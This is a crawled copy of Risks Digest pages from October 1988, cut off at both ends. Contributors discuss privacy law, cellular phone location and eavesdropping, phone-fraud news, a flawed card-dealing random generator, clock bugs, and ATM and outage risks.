prompted her to believe that HER SIDE was the right side.  Groan.  P.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Fly-by-wire, absence thereof
</A>
</H3>
<address>
attcan!utzoo!henry@uunet.UU.NET 
&lt;<A HREF="mailto:Henry Spencer">
Henry Spencer
</A>&gt;
</address>
<i>
Tue, 4 Oct 88 00:53:56 EDT
</i><PRE>

The hit of the Farnborough Air Show this year was definitely the MiG-29.  The
Soviets sent two of them, basically to show off.  They did everything the F-18s
and the like did, and a couple of things that nobody in the West had thought of
doing with a jet fighter.  The interesting thing is, unlike their Western
competitors, the MiG-29s do not use fly-by-wire! They have plain old hydraulic
controls, no computers involved.  Doesn't seem to hurt flight performance, and
the pilots claim the same "carefree handling" as the computerized fighters.

                                 Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
  re: A New Portal For The Offensive -- FAX ATTACKS
</A>
</H3>
<address>
GREENY 
&lt;<A HREF="mailto:MISS026@ECNCDC.BITNET">
MISS026@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Tue 04 Oct 1988 17:46 CDT
</i><PRE>

Gee, I always thought that it was illegal to make use of the telephone to
harrass, or say obscene things to people who didn't want to hear it (i.e.
heavy breather sicko-types) -- or at least it is here in Illinois.  And if I
remember correctly, doesn't a receiving FAX print out the transmitting PHONE
NUMBER somewhere on the transmission?  If so, and you keep getting stuff that
you don't appreciate -- just call the cops.  If that doesn't fix the problem,
try sending back what ya got! :-&gt;
                                                  Greeny

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Is Uncle Sam selling your name to mailing lists?
</A>
</H3>
<address>
Matthew Huntbach 
&lt;<A HREF="mailto:mmh@doc.imperial.ac.uk">
mmh@doc.imperial.ac.uk
</A>&gt;
</address>
<i>
Tue, 4 Oct 88 20:11:31 BST
</i><PRE>

In the U.K. the electoral register is obtainable in most places in 
computer readable form. It is fairly easy to use it to target names
in fact mailing companies have produced directories mapping postcodes
onto average prosperity. Also the changing fashions for first names
can enable a good guess at ages.

Clearly the electoral register has to be made available to candidates.  As a
political activist myself, I know the value of computers in fighting elections.
But even if you only gave the register to candidates, what is to stop a mailing
list company putting up a candidate simply to get hold of the register?

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
More on monitoring Cellular Phones
</A>
</H3>
<address>
&lt;<A HREF="mailto:linnig@skvax1.csc.ti.com">
linnig@skvax1.csc.ti.com
</A>&gt;
</address>
<i>
Tue, 4 Oct 88 18:01:58 CDT
</i><PRE>

Alan Kaminsky (ark%hoder@CS.RIT.EDU) writes:

&gt; When a phone detects a paging message with
&gt; its own address, it broadcasts a page response message.  This response is
&gt; received by all the cells in the system, and the signal strength is measured.
&gt; The cell receiving the strongest response is assumed to be the cell in which
&gt; the phone is located, an unused frequency in that cell is assigned, and the
&gt; phone call is switched to a transceiver in that cell.

Ah, but could the phone company send out a page without a following
"ring them" message?  If they could, then they could periodically
poll your position, and your faithful cellular phone would report
it without your knowledge.

&gt; As for business competitors monitoring calls you place on your cellular
&gt; telephone, to find out your clients' phone numbers:  This is perfectly
&gt; possible.... One hopes the FCC, police, etc.
&gt; would prevent anyone from offering such a product commercially.

Well, the communication privacy act recently passed prevents you from
intercepting the audio side of the cellular phone conversation, but I doubt
if it prevents you from picking up the dialing info. I think such a device
might be considered in the same class as a "pen register." Pen registers
record the numbers called on a telephone circuit. I believe the Supreme
Court doesn't even require a search warrant to place a pen register on a
phone. It may be quite legal to record the phone numbers dialed by a
cellular phone. Someone with a law background want to comment?

	Mike Linnig,
	Texas Instruments

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.60.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.62.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-14</DOCNO>
<DOCOLDNO>IA012-000131-B034-272</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.62.html 128.240.150.127 19970217023358 text/html 28413
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:32:27 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 62</TITLE>
<LINK REL="Prev" HREF="/Risks/7.61.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.63.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.61.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.63.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 62</H1>
<H2> Friday 7 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Assault on Privacy 
</A>
<DD>
<A HREF="#subj1.1">
Anthony G. Atkielski
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Interesting article in PCW 
</A>
<DD>
<A HREF="#subj2.1">
Hugh Davies
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Bridge over troubled pseudo-random generation 
</A>
<DD>
<A HREF="#subj3.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Reach Out and Touch Someone... for $650,000 
</A>
<DD>
<A HREF="#subj4.1">
Henry Cox
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Computer Security and Voice Mail ... $150,000 
</A>
<DD>
<A HREF="#subj5.1">
Davis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Risks of Cellular Phones 
</A>
<DD>
<A HREF="#subj6.1">
Wes Plouff
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Self-correcting (obliterating?) time 
</A>
<DD>
<A HREF="#subj7.1">
Jeffrey R Kell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Risks in ATMs, Parking, Power outages 
</A>
<DD>
<A HREF="#subj8.1">
Steve Philipson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
 Re: Assault on Privacy (Arthur Miller's speech, via Barry C. Nelson)
</A>
</H3>
<address>
"Anthony G. Atkielski" 
&lt;<A HREF="mailto:Atkielski@PCO-MULTICS.HBI.HONEYWELL.COM">
Atkielski@PCO-MULTICS.HBI.HONEYWELL.COM
</A>&gt;
</address>
<i>
Fri, 7 Oct 88 15:38 MST
</i><PRE>

Seriously, many of the concerns Mr. Miller voiced in his speech have already
been addressed outside the United States.  Specifically, France has had
legislation regulating the establishment and operation of virtually all
databases containing sensitive information about specific individuals for over
ten years.

French Public Law 78-17 of January 6, 1978 established a Commission on Freedom
and Computers and set forth requirements to be met by any organization wishing
to collect and process "personal" information, i.e., information that can be
linked to specific individuals.  The Commission is a relatively autonomous
organization charged with tracking the establishment and operation of databases
containing "personal" information throughout France.  Its members are selected
from both the public and private sector.

Some provisions of this legislation address certain of Mr. Miller's concerns
specifically, for example:

   &gt;  YOU can't get a copy of these records. There is no law which forces
   &gt;  private agencies to tell YOU what they know in most cases.

In France, Public Law 78-17 requires that most organizations maintaining
databases containing personal information declare the existence and purpose of
these databases to the Commission on Freedom and Computers.  These declarations
are a matter of public record.  These organizations MUST provide an individual
with a copy of any information they may have on him (except for medical
records, which must be requested through a licensed physician) on demand, and
they must provide the name and location of an agent through whom such requests
may be submitted in their declaration to the Commission.

   &gt;  Data is a lot like humans. It is born. Matures. Gets married to other
   &gt;  data, divorced. Gets old. One thing that it doesn't do is die. It has
   &gt;  to be killed.

The French legislation requires that expiration periods for various classes
of data be specified in the declaration to the Commission.  The organization
submitting the declaration must observe the expiration periods it declares.

   &gt;  Only the information which is necessary for the job at hand should be
   &gt;  collected.

Law 78-17 restricts the use of information concerning religious beliefs,
lifestyles, political beliefs, race, union membership, and legal records
(arrests, etc.) to organizations with a bona fide business interest in this
information (e.g., political parties, churches, unions, police departments).

   &gt;  People should have access to the data which you have about them.  There
   &gt;  should be a process for them to challenge any inaccuracies.

As already mentioned, this mecanism exists in France.  An individual may force
organizations to correct or update any information they may have on him.  They
are also obligated to correct and update information on their own initiative
as they become aware of inaccuracies.

   &gt;  There should be more control on the eventual uses of data which was
   &gt;  supplied for some business at hand, but has been sent elsewhere "upon
   &gt;  request"

Organizations must describe exactly with whom and under what conditions they
will share the information they have gathered in their declarations to the
Commission.  They must also propagate corrections and updates to these third
parties as they become necessary.

Public Law 78-17 requires that the following information be made available
to the public for any organization collecting and processing personal data:

   -- the identity of the organization
   -- the types of data being collected, their sources, the periods of
      their retention, and the identities of any organizations or
      individuals to whom the data might be communicated
   -- the purpose to which the collected data is to be put
   -- the agent through whom an individual may exercise his "right of
      access" to data collected by this organization concerning himself
   -- the categories of persons who might for any reason have direct
      access to the data
   -- the relationships defined between the various data collected for
      a given individual
   -- the types of security measures taken to ensure the confidentiality
      of the data
   -- the manner in which the data are communicated to organizations or
      individuals outside France, if applicable

All individuals have the right to oppose the collection of personal data
concerning themselves, except when such collection is required by government
agencies.  This implies that they may insist that, say, a credit bureau erase
all information concerning themselves from its database.

When personal information is collected from a person, that person is entitled
to the following information:

   -- whether or not the information requested is required or optional
   -- what will happen if they refuse to provide the information
   -- the persons or organizations to which the information will be
      communicated
   -- the fact that they are entitled to inspect and correct the
      information being collected ("right of access")

This part at least resembles the U.S. Privacy Act of 1974.

The French legislation also provides penalties for those who fail to heed the
law.  Organizations collecting data without filing a declaration may be subject
to a $31,000 fine and a three-year prison term (the prison term would apply
the individual(s) responsible for the violation).  Collecting information
forbidden by the law (religious affiliation, etc.) is punishable by a $310,000
fine and five years in jail.  Revealing confidential information to
unauthorized persons is punishable by a $3100 fine, plus six months in jail if
the act was deliberate (as opposed to being the result of carelessness or
negligence).  Finally, a $310,000 fine and five years in prison awaits anyone
who deliberately uses personal information for a purpose other than the purpose
declared to the Commission.

As far as I know, no legislation in the U.S. even comes close to this; if
there is any such legislation, it is being ignored.  Maybe it's time we
enacted something similar here in the U.S.

Anthony Atkielski,     Honeywell Bull Inc.,     Phoenix, AZ, U.S.A.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Interesting article in PCW
</A>
</H3>
<address>
&lt;<A HREF="mailto:"hugh_davies.WGC1RX"@Xerox.COM">
"hugh_davies.WGC1RX"@Xerox.COM
</A>&gt;
</address>
<i>
7 Oct 88 03:54:25 PDT (Friday)
</i><PRE>

The current edition of Personal Computer World (October) has a long and
interesting article on the application of the Data Protection Act, by Duncan
Campbell. ('On and Off the Record', P146). I have no intention of keying the
article in as it is several thousand words, but in essence it states that the
application of the DPA is effectively being sidestepped by Government
Departments, and that the Data Protection Registrar is toothless, underfunded
and overwhelmed with pointless paperwork.

Campbell, who has been a thorn in the side of Government secrecy for some
years, attempted to get a copy of his records on the PNC (Police National
Computer). He was at first unable to locate a copy of the Data Protection
Register, which lists all the registered computer systems in the UK. There is
supposed to be a copy in every Public Library, but most had never heard of it.
When he finally located a copy, the Librarian was reluctant to let him look at
it. Once he had found out which systems the PNC have, he then couldn't find out
who to write to. The DPR said write to the Data Protection Officer at the PNC,
but no-one ever replied. Finally he tried several local police stations, but
most denied knowing anything about it.  Once a police station accepted the
query, they gave him a form to fill in which asked several irrelevant and
personal questions. Finally, he got a reply from the PNC, 40 days after putting
in the query (the legal maximum time allowed). The DPA allows for a charge of
#10 for each query on each system, he queried each of the 5 systems running at
the PNC and was charged #50. He was refunded #10 because the PNC said that they
could not be bothered to inspect one of the files, because "there won't be
anything on it".

This whole shambles would appear to be mainly designed to deter anybody from
attempting to use the DPA to enquire on Government (or indeed, any other)
computer systems. Campbell conludes that the DPA is a complete failure, and
after reading the article I agree with him.

Also, some more interesting information on the PNC has recently come to light.
The British Government is busily (and fairly quietly) installing a system to
connect all the computer systems belonging to such organisations as the Inland
Revenue, Department of Health and Social Security and the Driver and Vehicle
Licensing Centre. This system is called the Government Data Network, or GDN for
short. Virtually no information has been forthcoming about this system. It has
been denied that the Police National Computer is to be part of this network,
but it has recently become clear that this is not the case. The reason being
that the present PNC is indeed not to be connected to the GDN. However, the
soon to be installed upgrade to the PNC, being imaginatively called 'PNC2' *IS*
to be connected to the GDN.

Hugh Davies, Computer Consultant, St.Albans, England.

The opinions expressed herein are mine, not those of my current, or any
past, employer or client.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Bridge over troubled pseudo-random generation
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Fri, 7 Oct 1988 14:42:30 PDT
</i><PRE>

Computers are now being used for all sorts of purposes for which people
formerly did the same job.  A case at hand deals with the game of bridge, in
which shuffling for tournament matches is now done by computer.  Alan
Truscott's column in the Sunday New York Times (2 October 1988) relates that
during the team-of-four matches the players sensed that the hands were
strangely familiar.  The American Chip player Martel "eventually solved the
problem: All the deals corresponded to those most of the players had
encountered in the open pairs final four days earlier, but with a suit rotation
-- spades had become hearts, hearts diamonds and so on.  The computer program
that generated the deals for both events was suffering from a flaw in its
random generator."  (The bridge rules state that a deal previously played must
be null and void.  Apparently that rule was extended on the spot to include
suit transformations.)

         [Thanks to Paul Abrahams for this one.  Now that he is no longer 
         President of the ACM, I presume he has a little more spare time to
         keep an eye out for us on computer related bridge risks.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Reach Out and Touch Someone...
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Fri, 7 Oct 88 09:00:08 edt
</i><PRE>

TEENS RUN UP TELEPHONE BILL OF $650 000

[From the Montreal Gazette, 7 October 1988]

LAS VEGAS (AP) - Ten teenage hackers may have run up $650 000 in
telephone calls by tricking phone company computers, and their parents
could be liable for the tab, authorities said.

"They reached out, all right," assistant U.S. Attorney Russel Mayer said
of the hackers, nine 14-year-olds and one 17-year-old.  "They reached
out and touched the world."

Tom Spurlock, resident agent in charge of the Las Vegas Secret Service
office, said the teen agers engaged in "blue boxing," a technique that
enabled them to talk to fellow hackers throughout Europe.

"They were calling numbers that were in the ATT system, and their
(computer) programs would allow them to `jump' ATT's circuits, allowing
them to call anywhere in the world."

The expensive shenanigans came to light when local phone company
officials discovered unusual activity on nine Las Vegas phone lines,
Spurlock said.  He said federal agents obtained warrants and searched
the nine homes.

The teenagers weren't taken into custody or charged, but their computers
were seized.

					Henry Cox

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Computer Security and Voice Mail
</A>
</H3>
<address>
&lt;<A HREF="mailto:davis@community-chest.mitre.org">
davis@community-chest.mitre.org
</A>&gt;
</address>
<i>
Fri, 07 Oct 88 13:35:03 -0400
</i><PRE>

From the Oct 6 Washington Post.
From a news item "Hackers Find New Way to Tap Long-Distance Phone Lines".

Zotos International Co. received two consecutive $75,000 phone bills, 
due to use of their automated answering system by hackers.

Zotos' switchboard automatically routes incoming calls to the proper
department.  Hackers found a way to circumvent the system to place outgoing
long-distance calls, in some cases to Pakistan and Senegal.  In this case the
calls were traced to Pakistani businesses in New York.  However, police
officials told Zotos that they must catch the hackers in the act in order to
prosecute.  The telephone company informed Zotos' mangement to pay the bills,
and collect from the susspected hackers via the civil courts.

In the same article, a related Los Angeles case of misuse of an electronic
switchboard system by outsiders described 'capture' of 200 of a company's
password-secured voice mail accounts.  Outsiders, in this cases a dope ring and
a prostitution ring, gained access by guessing the 4-digit passwords and
changing them.  The hackers backed off only when 'Federal authorities' began
tracing calls.

The article quotes security experts as recommending systems including several
access codes.  Also, major companies are adding software to detect changes in
calling patterns.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Risks of Cellular Phones
</A>
</H3>
<address>
Wes Plouff
&lt;<A HREF="mailto:plouff%nac.DEC@decwrl.dec.com ">
plouff%nac.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
6 Oct 88 09:45
</i><PRE>

Recent writers to RISKS, starting with Chuck Weinstock in issue 7.57, have
focused on the risk of vehicle location by cellular telephone systems.  In my
opinion, they exaggerate this risk and underestimate another risk of mobile
phones, the complete lack of privacy in radio transmissions.

Roughly 10 years ago I designed vehicle location controller hardware and
firmware used in the Washington-Baltimore cellular demonstration system.
That system led directly to products sold at least through the first 
waves of cellular system construction a few years ago.

Since cellular base stations have intentionally limited geographic
coverage, vehicle location is a requirement. This limitation is used to
conserve radio channels; one cell's frequencies can be re-used by others
far enough away in the same metropolitan area.  The cell system must
determine which cell a mobile user is located in when he begins a call,
and when during a conversation a vehicle crosses from one cell into
another.  Cells are set up perhaps 3 to 20 miles in diameter and range
from circular to very irregular shapes.  Cellular phone systems are 
designed with ample margins so that statistically very few calls will be 
lost or have degraded voice quality.

Making this system work does not require anything so fancy as
triangulation.  Vehicle location needs to be only good enough to keep
signal quality acceptably high.  John Gilmore explained in RISKS 7.58
how this works while the mobile phone is on-hook.  During a
conversation, the base station periodically measures the signal strength
of an active mobile in its cell.  When the signal strength goes below a
threshold, adjacent cells measure the mobile's signal strength.  This
'handoff trial' procedure requires no interaction with the mobile.  If
the mobile was stronger by some margin in an adjacent cell, both the mobile
phone and the cellular exchange switch are ordered to switch to a channel and
corresponding phone line in the new cell.  Since base stations commonly use
directional antennas to cover a full circle, mobiles could be reliably located
in one third of the cell area at best.  Distance-measuring techniques advocated
by AT&amp;T were not adopted because the added cost was too high for the modest
performance gain.

Certainly a cellular phone system can locate a mobile at any time, and always
locates a mobile during a conversation.  But the information is not
fine-grained enough to implement some of the schemes imagined by previous
writers.

A more important risk is the risk of conversations being intercepted.  The
public airwaves are simply that: public.  Scanner radios can easily be found or
modified to cover the cellular band, and listeners will tolerate lower signal
quality than cellular providers, hence one scanner can listen to cell base
stations over a wide area.  The communications privacy law is no shield because
listeners are undetectable.  To bring this back to risks of computers,
automated monitoring and recording of selected mobile phones is probably beyond
the reach of the average computer hobbyist, but easily feasible for a
commercial or government organization using no part of the infrastructure
whatever, just the control messages available on the air.

Wes Plouff, Digital Equipment Corp, Littleton, Mass. 
plouff%nac.dec@decwrl.dec.com

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     Self-correcting (obliterating?) time
</A>
</H3>
<address>
Jeffrey R Kell 
&lt;<A HREF="mailto:JEFF@UTCVM.BITNET">
JEFF@UTCVM.BITNET
</A>&gt;
</address>
<i>
Thu, 06 Oct 88 16:40:32 EDT
</i><PRE>

I just had a most aggravating experience with a time function which may be
of interest (and this is NOT related to year change, daylight savings time,
or any standard horror story).  It is machine specific (HP-3000/950).

I have been converting our subroutine library from our old HP-3000 (written
in SPL, an obscure systems language for that machine) into 'C' for the new
one.  One such routine returns the current date in the format we use as a
standard database date.  I was using ctime() and localtime() functions in
the resulting C function.  But upon testing, the function was returning a
date and time several days and a few odd hours prior to the current date.
Extensive testing and tracing revealed that ctime() was not returning the
correct clock value; yet all other date references within the operating
system were correct.  Being more than confused, I placed a problem report.

The cause of the 'bug' was the ctime() library function queries the lowest
level hardware clock, and could care less about the operating system clock.
This 'feature' came about by porting the C library more or less literally
from their Unix-based systems.  Although we had set the 'clock' when the
system was installed, MPE (the operating system) calculates an offset from
the time you 'set' and the hardware clock value, and saves this to set the
clock automatically after failures or power outages.

In summary, the hardware clock was never right.  MPE tried to correct for
this by juggling offsets, thus hiding the real underlying problem.  Finally
the whole bizarre mess was uncovered by the C library.  Needless to say, we
have finally correctly set the hardware clock.

| Jeffrey R Kell, Dir Tech Services |  UTC Postmaster/Listserv co-ord. |
| Admin Computing, 117 Hunter Hall  |Bitnet:  JEFF@UTCVM.BITNET        |
| Univ of Tennessee at Chattanooga  |JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU |

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Risks in ATMs, Parking, Power outages
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Thu, 6 Oct 88 20:15:54 PDT
</i><PRE>

   This past weekend I got to see/hear about three new RISKS in action.

   A friend was in from out of town.  She had an interesting story for
me.  It seems that a bank in New York has a great new feature for their
ATM cards:  if all you need is an account balance, you can go to a
special ATM reserved for that purpose, insert your card, and get your
balance immediately.  In the interest of saving time, they've made it
really simple ... you don't even have to enter your PID (personal I.D.
number or password)!!!  Veteran RISKS readers can see the folly in
this.  Of course, on of my friend's office co-workers had her wallet
stolen.  Inside was both her ATM card and a single blank check.  The
thief took the card to the ATM machine, found the balance, then made
out the check for that amount.  Determining liability in this case 
will be loads of fun.

   Next, I drove my friend to San Francisco International Airport for her
flight home.  I parked in the central parking structure.  On entry, you get a
ticket from a machine.  The ticket has the time stamped on it in ink, and also
a magnetic stripe.  The billing mechanism seemed obvious -- read the entry time
off the stripe, compute time in the structure, and bill accordingly.  It
surprised me when the clerk at the exit asked for the correct amount BEFORE I
handed him the ticket.  Then I noticed that he was facing a TV monitor, and
that my car's aft end was on the screen.  I asked about the system.  It seems
that they have another camera and operator enter your license plate number when
you enter.  They re-enter your plate number as you leave and find the elapsed
time between those events.  All your comings and goings are recorded.  Ain't
this a great one! Now big brother can keep track of your comings and goings at
the airport.  Right to privacy fans might consider public transport as a more
private mode of transportation.

     [RISKS has had reports before of people being charged for ten days when
     they parked on two consecutive weekends, and other related horrors. PGN]

   Finally, I came into work on Sunday to catch up on a few things.
I had mail!  And what did it say?  Here's the text, verbatim:

*   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *
Hi folks.  As of 6:13 today, we have completely lost power to N254, our main
communications facility.  A power transformer feeding that facility appears to
have been destroyed (it's all black and burned on the outside, and smells
really bad!).  While that facility is on UPS, the UPS does not have generator
back-up at this time, and as of an hour or so ago, the UPS batteries have been
drained.  I talked to the power people out there inspecting the transformer,
and they said it will be out at least until tommorrow (Monday).

Now, this means all things that depend on N254 are out of service.  These
include:

All external network access, BARRNET,MILNET,ARPANET,SPAN, etc...
All X.25 access via Telenet.
All ARCLAN access that is attached in the N254 ARCLAN hub, including NAS
    and N202. [ARCLAN is the Ames Research Center Local Area Net.  SHP]
All FTS service to other NASA facilities (at least for now).
    [FTS is the Federal Telephone System, our main long distance service. SHP]
All PSCN activities, including TMIS, and ARCNET.

With luck, we'll be back in service as of Monday afternoon or so.  The
transformer cannot be repaired, so a replacement will have to be found.
[FOUND??? No on site spares??? SHP]

Hopefully, this will inspire people to get that generator back-up system
funded...

*   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *

   There are lots of folks here at Ames who read RISKS, yet we still have a
system with massive losses from failure at a single site.  No NASA cracks --
I'll bet this situation is common.  Those of you at other sites who are
concerned about this kind of thing might show the above to your site managers.
Best of luck.
 				      Steve Philipson

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.61.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.63.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-15</DOCNO>
<DOCOLDNO>IA012-000131-B034-292</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.63.html 128.240.150.127 19970217023412 text/html 29919
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:32:40 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 63</TITLE>
<LINK REL="Prev" HREF="/Risks/7.62.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.64.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.62.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.64.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 63</H1>
<H2> day 1 October 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Killer terminals 
</A>
<DD>
<A HREF="#subj1.1">
Steve Wilson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Can't Happen and Antilock Braking Systems    
</A>
<DD>
<A HREF="#subj2.1">
Marcus Barrow and Robert Allen
</A><br>
<A HREF="#subj2.2">
 via Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  ATM's credit check 
</A>
<DD>
